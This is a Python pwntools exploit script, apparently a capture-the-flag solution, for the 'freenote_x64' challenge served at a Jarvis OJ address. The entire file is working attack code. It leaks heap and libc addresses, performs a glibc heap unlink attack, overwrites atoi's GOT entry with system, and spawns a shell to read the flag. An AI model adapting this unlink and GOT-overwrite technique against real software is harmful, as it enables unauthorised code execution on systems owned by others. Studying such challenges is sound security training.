#!/usr/bin/env python
# -*- coding: utf-8 -*-
# about unlink: https://www.jianshu.com/p/ed8a7364cc97 
from pwn import *
from sys import argv
# context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./guestbook2', {'LD_PRELOAD' : './libc.so.6'})
if argv[1] == 'l':
    io = process('./freenote_x64')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    # gdb.attach(io, 'b * 0x4010c1')
    raw_input('debug >')

else:
    io = remote('pwn2.jarvisoj.com', 9886)
    libc = ELF('./libc-2.19.so')

elf = ELF('./freenote_x64')


def addpost(lenth,post):
    io.sendlineafter('choice: ', '2')
    io.sendlineafter('note: ', str(lenth))
    io.sendafter('note: ', post)


def showpost():
    io.sendlineafter('choice: ', '1')


def editpost(no, lenth, post):
    io.sendlineafter('choice: ', '3')
    io.sendlineafter('number: ', str(no))
    io.sendlineafter('note: ', str(lenth))
    io.sendafter('note: ', post)


def deletepost(no):
    io.sendlineafter('choice: ', '4')
    io.sendlineafter('number: ', str(no))


def debug(proc,brkp):
    gdb.attach(proc, brkp)
    raw_input('debug->')


if __name__ == "__main__":
    # apply 5 chunks with usrsize = 0x80
    for i in range(5):
        addpost(0x80, str(i)*0x80)
    deletepost(3)
    deletepost(1)
        
    # leak the heap address
    editpost(0, 0x90, 'b' * (0x90-2) + '>>')
    showpost()
    io.recvuntil('>>')
    leak_address = u64(io.recvuntil('\n',drop = True).ljust(8, '\x00'))
    heap_address = leak_address - 0x19d0
    print 'heap_address -> ' + hex(heap_address)
    ptr0 = heap_address + 0x30
    '''
    pwndbg> telescope  0x603000 20
    00:0000│   0x603000 ◂— 0x0
    01:0008│   0x603008 ◂— 0x1821
    02:0010│   0x603010 ◂— 0x100         
    03:0018│   0x603018 ◂— 0x5
    04:0020│   0x603020 ◂— 0x1          
    05:0028│   0x603028 ◂— 0x80
    06:0030│   0x603030 —▸ 0x604830 ◂— 0x6161616161616161 ('aaaaaaaa')
    '''
    print 'ptr0 -> ' + hex(ptr0)


    # unlink: make the ptr point to ptr-0x18
    payload = p64(0x90) + p64(0x80) + p64(ptr0 - 0x18) + p64(ptr0 - 0x10)
    payload = payload.ljust(0x80, 'f')
    payload += p64(0x80) + p64(0x90*2) + '1' * 0x70   # change the state of pre chunk -> unuse
    editpost(0, len(payload), payload)
    # delete 1 to make the chunk0 unit with chunk0, at that time ,unlink
    deletepost(1)

    # now the ptr to chunk0 point to ptr-0x18(0x603018)
    payload = p64(2) + p64(1) + p64(0x100) + p64(ptr0 - 0x18)
    payload += p64(1) + p64(8) + p64(elf.got['atoi'])
    # make the prt of chunk1 point to atoi got
    payload = payload.ljust(0x100, '\x00')
    #print 'edit 0: len = 0x100'
    #raw_input('->')
    editpost(0, len(payload), payload)

    # leak the libc base
    showpost()
    io.recvuntil('1. ')
    atoi_addr =u64(io.recvuntil('\n',drop = True).ljust(8, '\x00'))
    libc_base = atoi_addr - libc.symbols['atoi']
    print 'libc base -> ' + hex(libc_base)
    sys_addr = libc_base + libc.symbols['system']
    print 'sys addr -> ' + hex(sys_addr)

    # change the atoi addr to system addr
    editpost(1, 8, p64(sys_addr))
    io.sendlineafter('choice: ', 'cat flag')
    io.interactive()
    io.close()
